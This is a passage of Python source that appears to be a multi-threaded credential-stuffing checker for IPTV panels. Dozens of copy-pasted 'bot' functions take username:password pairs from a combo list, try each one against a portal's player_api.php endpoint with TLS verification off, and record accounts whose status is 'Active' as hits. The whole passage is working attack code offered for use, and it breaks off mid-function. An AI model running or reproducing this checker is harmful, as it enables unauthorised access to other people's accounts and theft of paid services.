             bot='Bot_69'
             oran=""
             oran=round(((fyz)/(uz)*100),2)
             echox(user,pas,bot,fyz,oran,hit)
             
             
             link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
             bag1=0
             veri=""
             while True:
                 try:
                     res = ses.get(link,headers=HEADERd, timeout=15, verify=False)
                     break
                 except:
                     bag1=bag1+1
                     time.sleep(2)
                     if bag1==100:
                           quit()
             veri=str(res.text)
             if 'username' in veri:
                 
                 status=veri.split('status":')[1]
                 status=status.split(',')[0]
                 status=status.replace('"',"")
                 if status=='Active':
                     print('     💢 💢 🇭 🇮 🇹💢 💢                  ')
                     hit=hit+1
                     onay(veri,user,pas)

def d70():
    global hit
    say=0
    for fyz in range(70,uz,botsay):
        up=re.search(pattern,totLen[fyz],re.IGNORECASE)
        if up:
             fyzz = totLen[fyz].split(":")
             try:
                 user=str(fyzz[0].replace(" ",""))
             except:
                 userr='MarkCarl'
             try:
                 pas=str(fyzz[1].replace(" ",""))
                 pas=str(pas.replace('\n',""))
             except:
                 pas='MarkCarl'
             say = int(say) +1
             bot='Bot_70'
             oran=""
             oran=round(((fyz)/(uz)*100),2)
             echox(user,pas,bot,fyz,oran,hit)
             
             
             link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
             bag1=0
             veri=""
             while True:
                 try:
                     res = ses.get(link,headers=HEADERd, timeout=15, verify=False)
                     break
                 except:
                     bag1=bag1+1
                     time.sleep(2)
                     if bag1==100:
                           quit()
             veri=str(res.text)
             if 'username' in veri:
                 
                 status=veri.split('status":')[1]
                 status=status.split(',')[0]
                 status=status.replace('"',"")
                 if status=='Active':
                     print('     💢 💢 🇭 🇮 🇹💢 💢                  ')
                     hit=hit+1
                     onay(veri,user,pas)

def d71():
    global hit
    say=0
    for fyz in range(71,uz,botsay):
        up=re.search(pattern,totLen[fyz],re.IGNORECASE)
        if up:
             fyzz = totLen[fyz].split(":")
             try:
                 user=str(fyzz[0].replace(" ",""))
             except:
                 userr='MarkCarl'
             try:
                 pas=str(fyzz[1].replace(" ",""))
                 pas=str(pas.replace('\n',""))
             except:
                 pas='MarkCarl'
             say = int(say) +1
             bot='Bot_71'
             oran=""
             oran=round(((fyz)/(uz)*100),2)
             echox(user,pas,bot,fyz,oran,hit)
             
             
             link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
             bag1=0
             veri=""
             while True:
                 try:
                     res = ses.get(link,headers=HEADERd, timeout=15, verify=False)
                     break
                 except:
                     bag1=bag1+1
                     time.sleep(2)
                     if bag1==100:
                           quit()
             veri=str(res.text)
             if 'username' in veri:
                 
                 status=veri.split('status":')[1]
                 status=status.split(',')[0]
                 status=status.replace('"',"")
                 if status=='Active':
                     print('     💢 💢 🇭 🇮 🇹💢 💢                  ')
                     hit=hit+1
                     onay(veri,user,pas)

def d72():
    global hit
    say=0
    for fyz in range(72,uz,botsay):
        up=re.search(pattern,totLen[fyz],re.IGNORECASE)
        if up:
             fyzz = totLen[fyz].split(":")
             try:
                 user=str(fyzz[0].replace(" ",""))
             except:
                 userr='MarkCarl'
             try:
                 pas=str(fyzz[1].replace(" ",""))
                 pas=str(pas.replace('\n',""))
             except:
                 pas='MarkCarl'
             say = int(say) +1
             bot='Bot_72'
             oran=""
             oran=round(((fyz)/(uz)*100),2)
             echox(user,pas,bot,fyz,oran,hit)
             
             
             link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
             bag1=0
             veri=""
             while True:
                 try:
                     res = ses.get(link,headers=HEADERd, timeout=15, verify=False)
                     break
                 except:
                     bag1=bag1+1
                     time.sleep(2)
                     if bag1==100:
                           quit()
             veri=str(res.text)
             if 'username' in veri:
                 
                 status=veri.split('status":')[1]
                 status=status.split(',')[0]
                 status=status.replace('"',"")
                 if status=='Active':
                     print('     💢 💢 🇭 🇮 🇹💢 💢                  ')
                     hit=hit+1
                     onay(veri,user,pas)

def d73():
    global hit
    say=0
    for fyz in range(73,uz,botsay):
        up=re.search(pattern,totLen[fyz],re.IGNORECASE)
        if up:
             fyzz = totLen[fyz].split(":")
             try:
                 user=str(fyzz[0].replace(" ",""))
             except:
                 userr='MarkCarl'
             try:
                 pas=str(fyzz[1].replace(" ",""))
                 pas=str(pas.replace('\n',""))
             except:
                 pas='MarkCarl'
             say = int(say) +1
             bot='Bot_73'
             oran=""
             oran=round(((fyz)/(uz)*100),2)
             echox(user,pas,bot,fyz,oran,hit)
             
             
             link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
             bag1=0
             veri=""
             while True:
                 try:
                     res = ses.get(link,headers=HEADERd, timeout=15, verify=False)
                     break
                 except:
                     bag1=bag1+1
                     time.sleep(2)
                     if bag1==100:
                           quit()
             veri=str(res.text)
             if 'username' in veri:
                 
                 status=veri.split('status":')[1]
                 status=status.split(',')[0]
                 status=status.replace('"',"")
                 if status=='Active':
                     print('     💢 💢 🇭 🇮 🇹💢 💢                  ')
                     hit=hit+1
                     onay(veri,user,pas)

def d74():
    global hit
    say=0
    for fyz in range(74,uz,botsay):
        up=re.search(pattern,totLen[fyz],re.IGNORECASE)
        if up:
             fyzz = totLen[fyz].split(":")
             try:
                 user=str(fyzz[0].replace(" ",""))
             except:
                 userr='MarkCarl'
             try:
                 pas=str(fyzz[1].replace(" ",""))
                 pas=str(pas.replace('\n',""))
             except:
                 pas='MarkCarl'
             say = int(say) +1
             bot='Bot_74'
             oran=""
             oran=round(((fyz)/(uz)*100),2)
             echox(user,pas,bot,fyz,oran,hit)
             
             
             link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
             bag1=0
             veri=""
             while True:
                 try:
                     res = ses.get(link,headers=HEADERd, timeout=15, verify=False)
                     break
                 except:
                     bag1=bag1+1
                     time.sleep(2)
                     if bag1==100:
                           quit()
             veri=str(res.text)
             if 'username' in veri:
                 
                 status=veri.split('status":')[1]
                 status=status.split(',')[0]
                 status=status.replace('"',"")
                 if status=='Active':
                     print('     💢 💢 🇭 🇮 🇹💢 💢                  ')
                     hit=hit+1
                     onay(veri,user,pas)

def d75():
    global hit
    say=0
    for fyz in range(75,uz,botsay):
        up=re.search(pattern,totLen[fyz],re.IGNORECASE)
        if up:
             fyzz = totLen[fyz].split(":")
             try:
                 user=str(fyzz[0].replace(" ",""))
             except:
                 userr='MarkCarl'
             try:
                 pas=str(fyzz[1].replace(" ",""))
                 pas=str(pas.replace('\n',""))
             except:
                 pas='MarkCarl'
             say = int(say) +1
             bot='Bot_75'
             oran=""
             oran=round(((fyz)/(uz)*100),2)
             echox(user,pas,bot,fyz,oran,hit)
             
             
             link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
             bag1=0
             veri=""
             while True:
                 try:
                     res = ses.get(link,headers=HEADERd, timeout=15, verify=False)
                     break
                 except:
                     bag1=bag1+1
                     time.sleep(2)
                     if bag1==100:
                           quit()
             veri=str(res.text)
             if 'username' in veri:
                 
                 status=veri.split('status":')[1]
                 status=status.split(',')[0]
                 status=status.replace('"',"")
                 if status=='Active':
                     print('     💢 💢 🇭 🇮 🇹💢 💢                  ')
                     hit=hit+1
                     onay(veri,user,pas)

def d76():
    global hit
    say=0
    for fyz in range(76,uz,botsay):
        up=re.search(pattern,totLen[fyz],re.IGNORECASE)
        if up:
             fyzz = totLen[fyz].split(":")
             try:
                 user=str(fyzz[0].replace(" ",""))
             except:
                 userr='MarkCarl'
             try:
                 pas=str(fyzz[1].replace(" ",""))
                 pas=str(pas.replace('\n',""))
             except:
                 pas='MarkCarl'
             say = int(say) +1
             bot='Bot_76'
             oran=""
             oran=round(((fyz)/(uz)*100),2)
             echox(user,pas,bot,fyz,oran,hit)
             
             
             link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
             bag1=0
             veri=""
             while True:
                 try:
                     res = ses.get(link,headers=HEADERd, timeout=15, verify=False)
                     break
                 except:
                     bag1=bag1+1
                     time.sleep(2)
                     if bag1==100:
                           quit()
             veri=str(res.text)
             if 'username' in veri:
                 
                 status=veri.split('status":')[1]
                 status=status.split(',')[0]
                 status=status.replace('"',"")
                 if status=='Active':
                     print('     💢 💢 🇭 🇮 🇹💢 💢                  ')
                     hit=hit+1
                     onay(veri,user,pas)

def d77():
    global hit
    say=0
    for fyz in range(77,uz,botsay):
        up=re.search(pattern,totLen[fyz],re.IGNORECASE)
        if up:
             fyzz = totLen[fyz].split(":")
             try:
                 user=str(fyzz[0].replace(" ",""))
             except:
                 userr='MarkCarl'
             try:
                 pas=str(fyzz[1].replace(" ",""))
                 pas=str(pas.replace('\n',""))
             except:
                 pas='MarkCarl'
             say = int(say) +1
             bot='Bot_77'
             oran=""
             oran=round(((fyz)/(uz)*100),2)
             echox(user,pas,bot,fyz,oran,hit)
             
             
             link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
             bag1=0
             veri=""
             while True:
                 try:
                     res = ses.get(link,headers=HEADERd, timeout=15, verify=False)
                     break
                 except:
                     bag1=bag1+1
                     time.sleep(2)
                     if bag1==100:
                           quit()
             veri=str(res.text)
             if 'username' in veri:
                 
                 status=veri.split('status":')[1]
                 status=status.split(',')[0]
                 status=status.replace('"',"")
                 if status=='Active':
                     print('     💢 💢 🇭 🇮 🇹💢 💢                  ')
                     hit=hit+1
                     onay(veri,user,pas)

def d78():
    global hit
    say=0
    for fyz in range(78,uz,botsay):
        up=re.search(pattern,totLen[fyz],re.IGNORECASE)
        if up:
             fyzz = totLen[fyz].split(":")
             try:
                 user=str(fyzz[0].replace(" ",""))
             except:
                 userr='MarkCarl'
             try:
                 pas=str(fyzz[1].replace(" ",""))
                 pas=str(pas.replace('\n',""))
             except:
                 pas='MarkCarl'
             say = int(say) +1
             bot='Bot_78'
             oran=""
             oran=round(((fyz)/(uz)*100),2)
             echox(user,pas,bot,fyz,oran,hit)
             
             
             link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
             bag1=0
             veri=""
             while True:
                 try:
                     res = ses.get(link,headers=HEADERd, timeout=15, verify=False)
                     break
                 except:
                     bag1=bag1+1
                     time.sleep(2)
                     if bag1==100:
                           quit()
             veri=str(res.text)
             if 'username' in veri:
                 
                 status=veri.split('status":')[1]
                 status=status.split(',')[0]
                 status=status.replace('"',"")
                 if status=='Active':
                     print('     💢 💢 🇭 🇮 🇹💢 💢                  ')
                     hit=hit+1
                     onay(veri,user,pas)

def d79():
    global hit
    say=0
    for fyz in range(79,uz,botsay):
        up=re.search(pattern,totLen[fyz],re.IGNORECASE)
        if up:
             fyzz = totLen[fyz].split(":")
             try:
                 user=str(fyzz[0].replace(" ",""))
             except:
                 userr='MarkCarl'
             try:
                 pas=str(fyzz[1].replace(" ",""))
                 pas=str(pas.replace('\n',""))
             except:
                 pas='MarkCarl'
             say = int(say) +1
             bot='Bot_79'
             oran=""
             oran=round(((fyz)/(uz)*100),2)
             echox(user,pas,bot,fyz,oran,hit)
             
             
             link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
             bag1=0
             veri=""
             while True:
                 try:
                     res = ses.get(link,headers=HEADERd, timeout=15, verify=False)
                     break
                 except:
                     bag1=bag1+1
                     time.sleep(2)
                     if bag1==100:
                           quit()
             veri=str(res.text)
             if 'username' in veri:
                 
                 status=veri.split('status":')[1]
                 status=status.split(',')[0]
                 status=status.replace('"',"")
                 if status=='Active':
                     print('     💢 💢 🇭 🇮 🇹💢 💢                  ')
                     hit=hit+1
                     onay(veri,user,pas)

def d80():
    global hit
    say=0
    for fyz in range(80,uz,botsay):
        up=re.search(pattern,totLen[fyz],re.IGNORECASE)
        if up:
             fyzz = totLen[fyz].split(":")
             try:
                 user=str(fyzz[0].replace(" ",""))
             except:
                 userr='MarkCarl'
             try:
                 pas=str(fyzz[1].replace(" ",""))
                 pas=str(pas.replace('\n',""))
             except:
                 pas='MarkCarl'
             say = int(say) +1
             bot='Bot_80'
             oran=""
             oran=round(((fyz)/(uz)*100),2)
             echox(user,pas,bot,fyz,oran,hit)
             
             
             link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
             bag1=0
             veri=""
             while True:
                 try:
                     res = ses.get(link,headers=HEADERd, timeout=15, verify=False)
                     break
                 except:
                     bag1=bag1+1
                     time.sleep(2)
                     if bag1==100:
                           quit()
             veri=str(res.text)
             if 'username' in veri:
                 
                 status=veri.split('status":')[1]
                 status=status.split(',')[0]
                 status=status.replace('"',"")
                 if status=='Active':
                     print('     💢 💢 🇭 🇮 🇹💢 💢                  ')
                     hit=hit+1
                     onay(veri,user,pas)

def d81():
    global hit
    say=0
    for fyz in range(81,uz,botsay):
        up=re.search(pattern,totLen[fyz],re.IGNORECASE)
        if up:
             fyzz = totLen[fyz].split(":")
             try:
                 user=str(fyzz[0].replace(" ",""))
             except:
                 userr='MarkCarl'
             try:
                 pas=str(fyzz[1].replace(" ",""))
                 pas=str(pas.replace('\n',""))
             except:
                 pas='MarkCarl'
             say = int(say) +1
             bot='Bot_81'
             oran=""
             oran=round(((fyz)/(uz)*100),2)
             echox(user,pas,bot,fyz,oran,hit)
             
             
             link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
             bag1=0
             veri=""
             while True:
                 try:
                     res = ses.get(link,headers=HEADERd, timeout=15, verify=False)
                     break
                 except:
                     bag1=bag1+1
                     time.sleep(2)
                     if bag1==100:
                           quit()
             veri=str(res.text)
             if 'username' in veri:
                 
                 status=veri.split('status":')[1]
                 status=status.split(',')[0]
                 status=status.replace('"',"")
                 if status=='Active':
                     print('     💢 💢 🇭 🇮 🇹💢 💢                  ')
                     hit=hit+1
                     onay(veri,user,pas)

def d82():
    global hit
    say=0
    for fyz in range(82,uz,botsay):
        up=re.search(pattern,totLen[fyz],re.IGNORECASE)
        if up:
             fyzz = totLen[fyz].split(":")
             try:
                 user=str(fyzz[0].replace(" ",""))
             except:
                 userr='MarkCarl'
             try:
                 pas=str(fyzz[1].replace(" ",""))
                 pas=str(pas.replace('\n',""))
             except:
                 pas='MarkCarl'
             say = int(say) +1
             bot='Bot_82'
             oran=""
             oran=round(((fyz)/(uz)*100),2)
             echox(user,pas,bot,fyz,oran,hit)
             
             
             link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
             bag1=0
             veri=""
             while True:
                 try:
                     res = ses.get(link,headers=HEADERd, timeout=15, verify=False)
                     break
                 except:
                     bag1=bag1+1
                     time.sleep(2)
                     if bag1==100:
                           quit()
             veri=str(res.text)
             if 'username' in veri:
                 
                 status=veri.split('status":')[1]
                 status=status.split(',')[0]
                 status=status.replace('"',"")
                 if status=='Active':
                     print('     💢 💢 🇭 🇮 🇹💢 💢                  ')
                     hit=hit+1
                     onay(veri,user,pas)

def d83():
    global hit
    say=0
    for fyz in range(83,uz,botsay):
        up=re.search(pattern,totLen[fyz],re.IGNORECASE)
        if up:
             fyzz = totLen[fyz].split(":")
             try:
                 user=str(fyzz[0].replace(" ",""))
             except:
                 userr='MarkCarl'
             try:
                 pas=str(fyzz[1].replace(" ",""))
                 pas=str(pas.replace('\n',""))
             except:
                 pas='MarkCarl'
             say = int(say) +1
             bot='Bot_83'
             oran=""
             oran=round(((fyz)/(uz)*100),2)
             echox(user,pas,bot,fyz,oran,hit)
             
             
             link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
             bag1=0
             veri=""
             while True:
                 try:
                     res = ses.get(link,headers=HEADERd, timeout=15, verify=False)
                     break
                 except:
                     bag1=bag1+1
                     time.sleep(2)
                     if bag1==100:
                           quit()
             veri=str(res.text)
             if 'username' in veri:
                 
                 status=veri.split('status":')[1]
                 status=status.split(',')[0]
                 status=status.replace('"',"")
                 if status=='Active':
                     print('     ?? 💢 🇭 🇮 🇹💢 💢                  ')
                     hit=hit+1
                     onay(veri,user,pas)

def d84():
    global hit
    say=0
    for fyz in range(84,uz,botsay):
        up=re.search(pattern,totLen[fyz],re.IGNORECASE)
        if up:
             fyzz = totLen[fyz].split(":")
             try:
                 user=str(fyzz[0].replace(" ",""))
             except:
                 userr='MarkCarl'
             try:
                 pas=str(fyzz[1].replace(" ",""))
                 pas=str(pas.replace('\n',""))
             except:
                 pas='MarkCarl'
             say = int(say) +1
             bot='Bot_84'
             oran=""
             oran=round(((fyz)/(uz)*100),2)
             echox(user,pas,bot,fyz,oran,hit)
             
             
             link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
             bag1=0
             veri=""
             while True:
                 try:
                     res = ses.get(link,headers=HEADERd, timeout=15, verify=False)
                     break
                 except:
                     bag1=bag1+1
                     time.sleep(2)
                     if bag1==100:
                           quit()
             veri=str(res.text)
             if 'username' in veri:
                 
                 status=veri.split('status":')[1]
                 status=status.split(',')[0]
                 status=status.replace('"',"")
                 if status=='Active':
                     print('     💢 💢 🇭 🇮 🇹💢 💢                  ')
                     hit=hit+1
                     onay(veri,user,pas)

def d85():
    global hit
    say=0
    for fyz in range(85,uz,botsay):
        up=re.search(pattern,totLen[fyz],re.IGNORECASE)
        if up:
             fyzz = totLen[fyz].split(":")
             try:
                 user=str(fyzz[0].replace(" ",""))
             except:
                 userr='MarkCarl'
             try:
                 pas=str(fyzz[1].replace(" ",""))
                 pas=str(pas.replace('\n',""))
             except:
                 pas='MarkCarl'
             say = int(say) +1
             bot='Bot_85'
             oran=""
             oran=round(((fyz)/(uz)*100),2)
             echox(user,pas,bot,fyz,oran,hit)
             
             
             link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
             bag1=0
             veri=""
             while True:
                 try:
                     res = ses.get(link,headers=HEADERd, timeout=15, verify=False)
                     break
                 except:
                     bag1=bag1+1
                     time.sleep(2)
                     if bag1==100:
                           quit()
             veri=str(res.text)
             if 'username' in veri:
                 
                 status=veri.split('status":')[1]
                 status=status.split(',')[0]
                 status=status.replace('"',"")
                 if status=='Active':
                     print('     💢 💢 🇭 🇮 🇹💢 💢                  ')
                     hit=hit+1
                     onay(veri,user,pas)

def d86():
    global hit
    say=0
    for fyz in range(86,uz,botsay):
        up=re.search(pattern,totLen[fyz],re.IGNORECASE)
        if up:
             fyzz = totLen[fyz].split(":")
             try:
                 user=str(fyzz[0].replace(" ",""))
             except:
                 userr='MarkCarl'
             try:
                 pas=str(fyzz[1].replace(" ",""))
                 pas=str(pas.replace('\n',""))
             except:
                 pas='MarkCarl'
             say = int(say) +1
             bot='Bot_86'
             oran=""
             oran=round(((fyz)/(uz)*100),2)
             echox(user,pas,bot,fyz,oran,hit)
             
             
             link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
             bag1=0
             veri=""
             while True:
                 try:
                     res = ses.get(link,headers=HEADERd, timeout=15, verify=False)
                     break
                 except:
                     bag1=bag1+1
                     time.sleep(2)
                     if bag1==100:
                           quit()
             veri=str(res.text)
             if 'username' in veri:
                 
                 status=veri.split('status":')[1]
                 status=status.split(',')[0]
                 status=status.replace('"',"")
                 if status=='Active':
                     print('     💢 💢 🇭 🇮 🇹💢 💢                  ')
                     hit=hit+1
                     onay(veri,user,pas)

def d87():
    global hit
    say=0
    for fyz in range(87,uz,botsay):
        up=re.search(pattern,totLen[fyz],re.IGNORECASE)
        if up:
             fyzz = totLen[fyz].split(":")
             try:
                 user=str(fyzz[0].replace(" ",""))
             except:
                 userr='MarkCarl'
             try:
                 pas=str(fyzz[1].replace(" ",""))
                 pas=str(pas.replace('\n',""))
             except:
                 pas='MarkCarl'
             say = int(say) +1
             bot='Bot_87'
             oran=""
             oran=round(((fyz)/(uz)*100),2)
             echox(user,pas,bot,fyz,oran,hit)
             
             
             link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
             bag1=0
             veri=""
             while True:
                 try:
                     res = ses.get(link,headers=HEADERd, timeout=15, verify=False)
                     break
                 except:
                     bag1=bag1+1
                     time.sleep(2)
                     if bag1==100:
                           quit()
             veri=str(res.text)
             if 'username' in veri:
                 
                 status=veri.split('status":')[1]
                 status=status.split(',')[0]
                 status=status.replace('"',"")
                 if status=='Active':
                     print('     💢 💢 🇭 🇮 🇹💢 💢                  ')
                     hit=hit+1
                     onay(veri,user,pas)
                     
def d88():
    global hit
    say=0
    for fyz in range(88,uz,botsay):
        up=re.search(pattern,totLen[fyz],re.IGNORECASE)
        if up:
             fyzz = totLen[fyz].split(":")
             try:
                 user=str(fyzz[0].replace(" ",""))
             except:
                 userr='MarkCarl'
             try:
                 pas=str(fyzz[1].replace(" ",""))
                 pas=str(pas.replace('\n',""))
             except:
                 pas='MarkCarl'
             say = int(say) +1
             bot='Bot_88'
             oran=""
             oran=round(((fyz)/(uz)*100),2)
             echox(user,pas,bot,fyz,oran,hit)
             
             
             link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
             bag1=0
             veri=""
             while True:
                 try:
                     res = ses.get(link,headers=HEADERd, timeout=15, verify=False)
                     break
                 except:
                     bag1=bag1+1
                     time.sleep(2)
                     if bag1==100:
                           quit()
             veri=str(res.text)
             if 'username' in veri:
                 
                 status=veri.split('status":')[1]
                 status=status.split(',')[0]
                 status=status.replace('"',"")
                 if status=='Active':
                     print('     💢 💢 🇭 🇮 🇹💢 💢                  ')
                     hit=hit+1
                     onay(veri,user,pas)                     

def d89():
    global hit
    say=0
    for fyz in range(89,uz,botsay):
        up=re.search(pattern,totLen[fyz],re.IGNORECASE)
        if up:
             fyzz = totLen[fyz].split(":")
             try:
                 user=str(fyzz[0].replace(" ",""))
             except:
                 userr='MarkCarl'
             try:
                 pas=str(fyzz[1].replace(" ",""))
                 pas=str(pas.replace('\n',""))
             except:
                 pas='MarkCarl'
             say = int(say) +1
             bot='Bot_89'
             oran=""
             oran=round(((fyz)/(uz)*100),2)
             echox(user,pas,bot,fyz,oran,hit)
             
             
             link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
             bag1=0
             veri=""
             while True:
                 try:
                     res = ses.get(link,headers=HEADERd, timeout=15, verify=False)
                     break
                 except:
                     bag1=bag1+1
                     time.sleep(2)
                     if bag1==100:
                           quit()
             veri=str(res.text)
             if 'username' in veri:
                 
                 status=veri.split('status":')[1]
                 status=status.split(',')[0]
                 status=status.replace('"',"")
                 if status=='Active':
                     print('     💢 💢 🇭 🇮 🇹💢 💢                  ')
                     hit=hit+1
                     onay(veri,user,pas)

def d90():
    global hit
    say=0
    for fyz in range(90,uz,botsay):
        up=re.search(pattern,totLen[fyz],re.IGNORECASE)
        if up:
             fyzz = totLen[fyz].split(":")
             try:
                 user=str(fyzz[0].replace(" ",""))
             except:
                 userr='MarkCarl'
             try:
                 pas=str(fyzz[1].replace(" ",""))
                 pas=str(pas.replace('\n',""))
             except:
                 pas='MarkCarl'
             say = int(say) +1
             bot='Bot_90'
             oran=""
             oran=round(((fyz)/(uz)*100),2)
             echox(user,pas,bot,fyz,oran,hit)
             
             
             link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
             bag1=0
             veri=""
             while True:
                 try:
                     res = ses.get(link,headers=HEADERd, timeout=15, verify=False)
                     break
                 except:
                     bag1=bag1+1
                     time.sleep(2)
                     if bag1==100:
                           quit()
             veri=str(res.text)
             if 'username' in veri:
                 
                 status=veri.split('status":')[1]
                 status=status.split(',')[0]
                 status=status.replace('"',"")
                 if status=='Active':
                     print('     💢 💢 🇭 🇮 🇹💢 💢                  ')
                     hit=hit+1
                     onay(veri,user,pas)

def d91():
    global hit
    say=0
    for fyz in range(91,uz,botsay):
        up=re.search(pattern,totLen[fyz],re.IGNORECASE)
        if up:
             fyzz = totLen[fyz].split(":")
             try:
                 user=str(fyzz[0].replace(" ",""))
             except:
                 userr='MarkCarl'
             try:
                 pas=str(fyzz[1].replace(" ",""))
                 pas=str(pas.replace('\n',""))
             except:
                 pas='MarkCarl'
             say = int(say) +1
             bot='Bot_91'
             oran=""
             oran=round(((fyz)/(uz)*100),2)
             echox(user,pas,bot,fyz,oran,hit)
             
             
             link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
             bag1=0
             veri=""
             while True:
                 try:
                     res = ses.get(link,headers=HEADERd, timeout=15, verify=False)
                     break
                 except:
                     bag1=bag1+1
                     time.sleep(2)
                     if bag1==100:
                           quit()
             veri=str(res.text)
             if 'username' in veri:
                 
                 status=veri.split('status":')[1]
                 status=status.split(',')[0]
                 status=status.replace('"',"")
                 if status=='Active':
                     print('     💢 💢 🇭 🇮 🇹💢 💢                  ')
                     hit=hit+1
                     onay(veri,user,pas)

def d92():
    global hit
    say=0
    for fyz in range(92,uz,botsay):
        up=re.search(pattern,totLen[fyz],re.IGNORECASE)
        if up:
             fyzz = totLen[fyz].split(":")
             try:
                 user=str(fyzz[0].replace(" ",""))
             except:
                 userr='MarkCarl'
             try:
                 pas=str(fyzz[1].replace(" ",""))
                 pas=str(pas.replace('\n',""))
             except:
                 pas='MarkCarl'
             say = int(say) +1
             bot='Bot_92'
             oran=""
             oran=round(((fyz)/(uz)*100),2)
             echox(user,pas,bot,fyz,oran,hit)
             
             
             link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
             bag1=0
             veri=""
             while True:
                 try:
                     res = ses.get(link,headers=HEADERd, timeout=15, verify=False)
                     break
                 except:
                     bag1=bag1+1
                     time.sleep(2)
                     if bag1==100:
                           quit()
             veri=str(res.text)
             if 'username' in veri:
                 
                 status=veri.split('status":')[1]
                 status=status.split(',')[0]
                 status=status.replace('"',"")
                 if status=='Active':
                     print('     💢 💢 🇭 🇮 🇹💢 💢                  ')
                     hit=hit+1
                     onay(veri,user,pas)

def d93():
    global hit
    say=0
    for fyz in range(93,uz,botsay):
        up=re.search(pattern,totLen[fyz],re.IGNORECASE)
        if up:
             fyzz = totLen[fyz].split(":")
             try:
                 user=str(fyzz[0].replace(" ",""))
             except:
                 userr='MarkCarl'
             try:
                 pas=str(fyzz[1].replace(" ",""))
                 pas=str(pas.replace('\n',""))
             except:
                 pas='MarkCarl'
             say = int(say) +1
             bot='Bot_93'
             oran=""
             oran=round(((fyz)/(uz)*100),2)
             echox(user,pas,bot,fyz,oran,hit)
             
             
             link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
             bag1=0
             veri=""
             while True:
                 try:
                     res = ses.get(link,headers=HEADERd, timeout=15, verify=False)
                     break
                 except:
                     bag1=bag1+1
                     time.sleep(2)
                     if bag1==100:
                           quit()
             veri=str(res.text)
             if 'username' in veri:
                 
                 status=veri.split('status":')[1]
                 status=status.split(',')[0]
                 status=status.replace('"',"")
                 if status=='Active':
                     print('     💢 💢 🇭 🇮 🇹💢 💢                  ')
                     hit=hit+1
                     onay(veri,user,pas)

def d94():
    global hit
    say=0
    for fyz in range(94,uz,botsay):
        up=re.search(pattern,totLen[fyz],re.IGNORECASE)
        if up:
             fyzz = totLen[fyz].split(":")
             try:
                 user=str(fyzz[0].replace(" ",""))
             except:
                 userr='MarkCarl'
             try:
                 pas=str(fyzz[1].replace(" ",""))
                 pas=str(pas.replace('\n',""))
             except:
                 pas='MarkCarl'
             say = int(say) +1
             bot='Bot_94'
             oran=""
             oran=round(((fyz)/(uz)*100),2)
             echox(user,pas,bot,fyz,oran,hit)
             
             
             link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
             bag1=0
             veri=""
             while True:
                 try:
                     res = ses.get(link,headers=HEADERd, timeout=15, verify=False)
                     break
                 except:
                     bag1=bag1+1
                     time.sleep(2)
                     if bag1==100:
                           quit()
             veri=str(res.text)
             if 'username' in veri:
                 
                 status=veri.split('status":')[1]
                 status=status.split(',')[0]
                 status=status.replace('"',"")
                 if status=='Active':
                     print('     💢 💢 🇭 🇮 🇹💢 💢                  ')
                     hit=hit+1
                     onay(veri,user,pas)

def d95():
    global hit
    say=0
    for fyz in range(95,uz,botsay):
        up=re.search(pattern,totLen[fyz],re.IGNORECASE)
        if up:
             fyzz = totLen[fyz].split(":")
             try:
                 user=str(fyzz[0].replace(" ",""))
             except:
                 userr='MarkCarl'
             try:
                 pas=str(fyzz[1].replace(" ",""))
                 pas=str(pas.replace('\n',""))
             except:
                 pas='MarkCarl'
             say = int(say) +1
             bot='Bot_95'
             oran=""
             oran=round(((fyz)/(uz)*100),2)
             echox(user,pas,bot,fyz,oran,hit)
             
             
             link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
             bag1=0
             veri=""
             while True:
                 try:
                     res = ses.get(link,headers=HEADERd, timeout=15, verify=False)
                     break
                 except:
                     bag1=bag1+1
                     time.sleep(2)
                     if bag1==100:
                           quit()
             veri=str(res.text)
             if 'username' in veri:
                 
                 status=veri.split('status":')[1]
                 status=status.split(',')[0]
                 status=status.replace('"',"")
                 if status=='Active':
                     print('     💢 💢 🇭 🇮 🇹💢 💢                  ')
                     hit=hit+1
                     onay(veri,user,pas)

def d96():
    global hit
    say=0
    for fyz in range(96,uz,botsay):
        up=re.search(pattern,totLen[fyz],re.IGNORECASE)
        if up:
             fyzz = totLen[fyz].split(":")
             try:
                 user=str(fyzz[0].replace(" ",""))
             except:
                 userr='MarkCarl'
             try:
                 pas=str(fyzz[1].replace(" ",""))
                 pas=str(pas.replace('\n',""))
             except:
                 pas='MarkCarl'
             say = int(say) +1
             bot='Bot_96'
             oran=""
             oran=round(((fyz)/(uz)*100),2)
             echox(user,pas,bot,fyz,oran,hit)
             
             
             link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
             bag1=0
             veri=""
             while True:
                 try:
                     res = ses.get(link,headers=HEADERd, timeout=15, verify=False)
                     break
                 except:
                     bag1=bag1+1
                     time.sleep(2)
                     if bag1==100:
                           quit()
             veri=str(res.text)
